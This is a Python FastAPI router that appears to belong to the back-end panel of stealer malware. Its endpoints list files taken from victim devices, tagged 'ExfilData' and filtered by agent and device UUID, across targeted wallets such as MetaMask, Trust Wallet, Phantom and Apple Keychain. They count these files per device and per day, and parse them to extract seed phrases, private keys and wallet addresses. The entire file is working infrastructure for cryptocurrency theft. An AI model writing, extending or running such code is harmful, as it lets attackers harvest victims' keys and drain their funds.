import os
from fastapi import APIRouter, Depends, HTTPException, Query
from sqlalchemy.orm import Session
from sqlalchemy import desc, func
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List

from ..database import get_db, ExfilData
from ..auth import get_current_user
from ..wallet_parser import parse_wallet_file, detect_mnemonic, detect_private_keys, detect_addresses
from ._helpers import apply_agent_filter_exfil, _assert_owns_exfil

router = APIRouter(prefix="/api/wallets", tags=["wallets"], redirect_slashes=False)

WALLET_TYPES = [
    {"id": "metamask", "name": "MetaMask", "platform": "Browser Extension / Mobile"},
    {"id": "trust", "name": "Trust Wallet", "platform": "Mobile"},
    {"id": "coinbase", "name": "Coinbase Wallet", "platform": "Mobile"},
    {"id": "imtoken", "name": "imToken", "platform": "Mobile"},
    {"id": "phantom", "name": "Phantom", "platform": "Browser Extension / Mobile"},
    {"id": "tokenpocket", "name": "TokenPocket", "platform": "Mobile"},
    {"id": "alphawallet", "name": "AlphaWallet", "platform": "Mobile"},
    {"id": "mathwallet", "name": "MathWallet", "platform": "Multi-platform"},
    {"id": "tronlink", "name": "TronLink", "platform": "Browser Extension / Mobile"},
    {"id": "keplr", "name": "Keplr", "platform": "Browser Extension"},
    {"id": "cosmostation", "name": "Cosmostation", "platform": "Mobile / Extension"},
    {"id": "keychain", "name": "Apple Keychain", "platform": "iOS / macOS"},
]


@router.get("/types")
async def wallet_types(current_user=Depends(get_current_user)):
    return {"items": WALLET_TYPES, "total": len(WALLET_TYPES)}


@router.get("")
async def list_wallets(
    skip: int = Query(0, ge=0), limit: int = Query(100, ge=1, le=500),
    device_uuid: Optional[str] = None, wallet_type: Optional[str] = None,
    sort: Optional[str] = "uploaded_at", order: Optional[str] = "desc",
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    q = db.query(ExfilData).filter((ExfilData.category == "wallet") | (ExfilData.category.like("%wallet%")))
    q = apply_agent_filter_exfil(q, db, current_user)
    if device_uuid:
        q = q.filter(ExfilData.device_uuid == device_uuid)
    if wallet_type:
        like = f"%{wallet_type}%"
        q = q.filter((ExfilData.path.like(like)) | (ExfilData.description.like(like)))
    total = q.count()
    order_func = desc if (order or "desc").lower() != "asc" else None
    col = {"uploaded_at": ExfilData.uploaded_at, "file_size": ExfilData.file_size, "id": ExfilData.id
           }.get((sort or "uploaded_at").lower(), ExfilData.uploaded_at)
    q = q.order_by(desc(col) if order_func else col.asc())
    rows = q.offset(skip).limit(limit).all()
    items = []
    for e in rows:
        items.append({
            "id": e.id, "device_uuid": e.device_uuid, "category": e.category,
            "path": e.path, "description": e.description,
            "file_path": e.file_path, "file_size": e.file_size,
            "uploaded_at": e.uploaded_at.isoformat() if e.uploaded_at else None,
        })
    return {"total": total, "items": items, "skip": skip, "limit": limit}


@router.get("/stats")
async def wallet_stats(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    q = db.query(ExfilData).filter((ExfilData.category == "wallet") | (ExfilData.category.like("%wallet%")))
    q = apply_agent_filter_exfil(q, db, current_user)
    total_files = q.count() or 0
    total_size = q.with_entities(func.sum(ExfilData.file_size)).scalar() or 0
    today = datetime.now().date()
    today_start = datetime.combine(today, datetime.min.time())
    today_count = q.filter(ExfilData.uploaded_at >= today_start).count() or 0
    unique_devices = q.with_entities(func.count(func.distinct(ExfilData.device_uuid))).scalar() or 0

    TYPE_KEYWORDS = {
        "MetaMask": ["metamask", "meta mask"],
        "Trust": ["trust wallet", "trustwallet", "trust"],
        "imToken": ["imtoken", "im token"],
        "TokenPocket": ["tokenpocket", "token pocket", "tpwallet"],
        "Phantom": ["phantom"],
        "OKX": ["okx", "okex", "ok wallet"],
    }
    by_type: Dict[str, int] = {}
    rows = q.with_entities(ExfilData.path, ExfilData.description).all()
    for path, desc in rows:
        blob = " ".join([str(path or ""), str(desc or "")]).lower()
        matched = None
        for tkey, kws in TYPE_KEYWORDS.items():
            if any(k in blob for k in kws):
                matched = tkey
                break
        if matched:
            by_type[matched] = by_type.get(matched, 0) + 1

    return {
        "total_files": total_files,
        "total_size": int(total_size),
        "today_new": today_count,
        "unique_devices": unique_devices,
        "by_type": by_type,
    }


@router.get("/parsed")
async def parsed_wallets(
    skip: int = Query(0, ge=0), limit: int = Query(50, ge=1, le=200),
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    q = db.query(ExfilData).filter((ExfilData.category == "wallet") | (ExfilData.category.like("%wallet%")))
    q = apply_agent_filter_exfil(q, db, current_user)
    total = q.count() or 0
    rows = q.order_by(desc(ExfilData.uploaded_at)).offset(skip).limit(limit).all()
    all_phrase: List[str] = []
    all_priv: List[str] = []
    all_addr: List[str] = []
    items = []
    seen_phrase = set()
    seen_priv = set()
    seen_addr = set()
    for e in rows:
        entry = {
            "id": e.id, "device_uuid": e.device_uuid, "path": e.path,
            "file_size": e.file_size,
            "uploaded_at": e.uploaded_at.isoformat() if e.uploaded_at else None,
            "phrase": [], "privkeys": [], "addresses": [],
        }
        fp = e.file_path
        if fp and os.path.exists(fp):
            try:
                parsed = parse_wallet_file(fp)
                for p in parsed.get("phrase") or []:
                    jp = " ".join(p) if isinstance(p, list) else p
                    if jp not in seen_phrase:
                        seen_phrase.add(jp)
                        all_phrase.append(jp)
                    entry["phrase"].append(jp)
                for pk in parsed.get("privkeys") or []:
                    if pk not in seen_priv:
                        seen_priv.add(pk)
                        all_priv.append(pk)
                    entry["privkeys"].append(pk)
                for a in parsed.get("addresses") or []:
                    if a not in seen_addr:
                        seen_addr.add(a)
                        all_addr.append(a)
                    entry["addresses"].append(a)
            except Exception:
                pass
        if e.data_json:
            import json as _json
            try:
                dj = _json.loads(e.data_json)
                text = _json.dumps(dj, ensure_ascii=False)
                mp = detect_mnemonic(text)
                if mp:
                    jp = " ".join(mp)
                    if jp not in seen_phrase:
                        seen_phrase.add(jp)
                        all_phrase.append(jp)
                        entry["phrase"].append(jp)
                for pk in detect_private_keys(text):
                    if pk not in seen_priv:
                        seen_priv.add(pk)
                        all_priv.append(pk)
                    entry["privkeys"].append(pk)
                for a in detect_addresses(text):
                    if a not in seen_addr:
                        seen_addr.add(a)
                        all_addr.append(a)
                    entry["addresses"].append(a)
            except Exception:
                pass
        items.append(entry)
    return {
        "total": total,
        "items": items,
        "summary": {
            "unique_phrases": len(all_phrase),
            "unique_privkeys": len(all_priv),
            "unique_addresses": len(all_addr),
        },
        "skip": skip, "limit": limit,
    }
